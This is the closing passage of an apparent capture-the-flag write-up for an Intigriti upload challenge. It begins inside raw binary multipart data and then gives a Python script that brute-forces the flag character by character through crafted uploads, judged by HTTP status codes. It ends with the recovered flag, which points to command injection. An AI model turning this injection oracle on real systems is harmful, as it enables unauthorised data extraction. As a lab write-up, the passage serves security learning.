0\x00\x02\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\aLstsz\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01Î\x00\x00\x06q\x00\x00\x001\x00\x00\x001\x00\x00\x00\x1e\x00\x00\x00A\x00\x00\x00\x1a\x00\x00\x00\\\x00\x00\x00&\x00\x00\x00\x1d\x00\x00\x00\x1a\x00\x00\x00\x8c\x00\x00\x00-\x00\x00\x00\x15\x00\x00\x00\x16\x00\x00\x00£\x00\x00\x00\x1a\x00\x00\x00\x1d\x00\x00\x00¢\x00\x00\x00>\x00\x00\x00\x16\x00\x00\x00 \x00\x00\x00Ø\x00\x00\x00K\x00\x00\x00/\x00\x00\x007\x00\x00\x00µ\x00\x00\x001\x00\x00\x00¿\x00\x00\x00/\x00\x00\x00\x1f\x00\x00\x00\x14\x00\x00\x00\x95\x00\x00\x00\x1a\x00\x00\x00\x14\x00\x00\x00\x0e\x00\x00\x00¨\x00\x00\x00\x14\x00\x00\x00\x13\x00\x00\x00\f\x00\x00\x00p\x00\x00\x00\x0e\x00\x00\x00\f\x00\x00\x00i\x00\x00\x00\x0e\x00\x00\x00\f\x00\x00\x00\f\x00\x00\x00V\x00\x00\x00\x0f\x00\x00\x00\f\x00\x00\x00F\x00\x00\x00\x0e\x00\x00\x00\x0e\x00\x00\x00\f\x00\x00\x00=\x00\x00\x00\x0f\x00\x00\x00\x0e\x00\x00\x00\f\x00\x00\x006\x00\x00\x00\x0e\x00\x00\x00\f\x00\x00\x00>\x00\x00\x00;\x00\x00\x00N\x00\x00\x000\x00\x00\x00\x1b\x00\x00\x00!\x00\x00\x00^\x00\x00\x00,\x00\x00\x001\x00\x00\x00.\x00\x00\x00\f\x00\x00\x00&\x00\x00\x00-\x00\x00\x00\f\x00\x00\x00 \x00\x00\x00\x0e\x00\x00\x00\r\x00\x00\x00\f\x00\x00\x007\x00\x00\x00\x19\x00\x00\x00]\x00\x00\x00\x16\x00\x00\x00I\x00\x00\x00\x1d\x00\x00\x00+\x00\x00\x00\x12\x00\x00\x00\x0f\x00\x00\x00\f\x00\x00\x00.\x00\x00\x00\x0e\x00\x00\x00\r\x00\x00\x00\f\x00\x00\x00+\x00\x00\x00\f\x00\x00\x00k\x00\x00\x00\x1a\x00\x00\x00\x1c\x00\x00\x00m\x00\x00\x00 \n\r\n------WebKitFormBoundaryVe8B2hOjY4mvCW76--\r\n'
		encoded_data = data.encode()

		return requests.post('https://challenge-0723.intigriti.io/upload', headers=headers, data=encoded_data)

headers = {
    'Host': 'challenge-0723.intigriti.io',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://challenge-0723.intigriti.io',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryVe8B2hOjY4mvCW76',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
}

last_match = ""
flag = ""

while True:

	response = sendRequest(flag + "}")

	if response.status_code == 200:
			last_match = x
			flag += x
			break
    
	for x in string.printable:

		if x == "\"":
			continue

		if x == "*":
			continue

		if x == "$":
			continue

		if x == "\\":
			continue

		response = sendRequest(flag + x)

		if response.status_code == 200:
			last_match = x
			flag += x
			break
```

Each time the script detects a new character, it checks if the end of the flag has been reached by appending a `}` character. If the status code is 200 it stops the execution and the flag is found. 

All in all this is how I found the final flag: `INTIGRITI{c0mm4nd.1nj3c710n.4nd.0p3n55l.5h3ll}`. 

